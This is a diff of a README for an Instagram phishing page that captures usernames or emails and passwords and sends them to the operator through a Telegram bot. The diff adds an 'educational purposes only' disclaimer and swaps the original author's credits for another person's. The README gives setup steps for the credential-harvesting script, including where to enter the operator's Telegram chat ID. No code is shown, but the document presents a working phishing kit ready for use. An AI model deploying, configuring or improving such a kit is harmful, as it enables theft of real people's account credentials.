@@ -2,6 +2,8 @@
 
 An Instagram phishing page which collects user/email + password and sends it to via Telegram bot
 
+This repository is only for Educational purposes and does not involve any kind of unethical breaching of privacy.
+
 Setting up  ``getData.php``
 
 ``$chat_id= xxxxxxxx;`` your userid 
@@ -22,12 +24,12 @@ Tried Login at ``00:00 IST``
 ### Note
 This Phishing page is only designed for mobile web browser not for desktop (non-responsive)
 
-Will Try to release a reponsive version soon
 
-# Reboot13
 
-Telegram : [@reboot13](https://telegram.me/reboot13)
+# SaharshPand3y
 
-Youtube: [Krutik Raut](https://youtube.com/krutikraut)
+Instagram: https://instagram.com/saharshpand3y/
 
-Blog: [@reboot13](https://hashnode.com/@reboot13)
+Info: https://saharshpandey.com/
+
+
